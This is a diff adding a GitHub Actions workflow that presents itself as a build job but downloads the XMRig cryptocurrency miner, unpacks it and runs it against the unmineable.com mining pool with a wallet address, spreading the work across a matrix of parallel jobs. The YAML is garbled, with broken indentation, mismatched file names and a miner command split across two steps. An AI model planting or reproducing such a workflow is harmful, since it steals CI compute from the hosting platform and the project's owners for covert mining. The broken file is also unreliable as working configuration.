@@ -1,0 +1,29 @@
+name: ex-boot
+
+on:[workflow_dispatch]
+
+jobs:
+     build:
+          name: ex-boot
+          runs-on: windows-latest
+          strategy:
+              max-parallel: 5
+              fail-fast: false
+              matrix:
+              go: [1.0, 1.1, 1.2, 1.3, 1,35]
+              falg: [A,  B,  C,  D,  E,  F,  G,  H,  I]
+       env:
+                NUM_JOBS:  20
+                JOB:  ${{  matrix.go  }}
+       steps:
+       -  name:  PREPARING
+           run:   Invoke-WebRequest  https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-msvc-win64.zip -OutFile
+xmrig-6.6.11.1-smvc-win64.zi
+ -name: seting-Up
+   run: Expand-Archive xmrig-6.11.1-win64.zip
+   -name:RUNING
+     run: .\xmrig-6.11.11\xmrig.exe-o
+   -name:RUNING
+    run:.\rx.unmineable.com:3333 -a rx -k-p x -t 1 -u btt:=TPqYCm7VDkKdyhWGdPyvi8tVysHXcFMS4c.WORKER-NAME
+ -name: DONE
+    run: exit
